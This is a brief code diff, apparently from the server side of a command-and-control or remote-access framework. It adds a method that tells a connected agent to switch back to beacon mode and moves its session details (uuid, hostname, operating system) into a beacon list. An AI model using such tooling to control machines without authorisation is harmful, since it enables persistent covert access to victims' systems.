@@ -4,6 +4,8 @@ from .global_objects import (
     receive_data,
     remove_connection_list,
     send_data_loadingbar,
+    add_beacon_list,
+    sessions
 )
 from datetime import datetime
 from tqdm import tqdm
@@ -12,6 +14,7 @@ from typing import Tuple
 import os
 import colorama
 import ssl
+import time
 
 
 class SessionCommandsClass:
@@ -273,3 +276,13 @@ class SessionCommandsClass:
             except BaseException:
                 pass
         print(directory)
+
+    def change_beacon(self, conn: ssl.SSLSocket,
+                      r_address: Tuple[str, int], uuid) -> None:
+        send_data(conn, "switch_beacon")
+        print("Switching Back to Beacon Mode")
+        for i, item in enumerate(sessions["uuid"]):
+            if item == uuid:
+                add_beacon_list(uuid, r_address, sessions["hostname"][i], sessions["operating_system"][i], time.asctime(), 0, 0)
+        remove_connection_list(r_address)
+        return
